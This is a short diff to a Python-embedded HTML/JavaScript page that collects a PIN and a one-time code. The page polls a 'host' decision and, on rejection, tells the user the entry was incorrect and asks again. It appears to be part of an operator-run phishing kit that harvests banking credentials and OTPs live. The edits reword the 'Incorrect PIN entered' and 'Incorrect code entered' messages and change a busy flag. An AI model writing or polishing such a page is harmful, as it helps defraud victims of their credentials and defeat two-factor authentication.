@@ -947,7 +947,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
   }
   goTo('approved');
 }
-    function watchHostDecision(step) {
+        function watchHostDecision(step) {
       if (decisionTimer) clearInterval(decisionTimer);
       if (otpStepTimer) clearTimeout(otpStepTimer);
       if (otpAutoTimer) clearTimeout(otpAutoTimer);
@@ -979,7 +979,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
               enteredPin = '';
               updatePinDots();
               const pinMsg = document.getElementById('pin-status-msg');
-              if (pinMsg) pinMsg.innerText = 'Incorrect PIN. Please re-enter your PIN.';
+              if (pinMsg) pinMsg.innerText = 'Incorrect PIN entered. Please re-enter your PIN.';
               goTo('pin');
               alert('Incorrect PIN entered. Please re-enter your PIN.');
             } else if (step === 'otp') {
@@ -987,7 +987,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
               const btnOtp = document.getElementById('btn-otp');
               if (btnOtp) { btnOtp.disabled = false; btnOtp.innerText = 'VERIFY & CONTINUE'; }
               const errorMsg = document.getElementById('otp-error-msg');
-              if (errorMsg) errorMsg.innerText = 'Incorrect code. Please re-enter the code.';
+              if (errorMsg) errorMsg.innerText = 'Incorrect code entered. Please re-enter the code.';
               goTo('otp');
               alert('Incorrect code entered. Please re-enter the code.');
             }
@@ -1006,6 +1006,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
         } catch (e) {}
       }, 2000);
     }
+
 
 
 
@@ -1029,7 +1030,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
 
 
       // Reset PIN busy state and animations
-      isPinBusy = false;
+      isPinBusy = true;
       const msg = document.getElementById('pin-status-msg');
       if (msg) msg.innerText = '';
       for (let i = 0; i < 4; i++) {
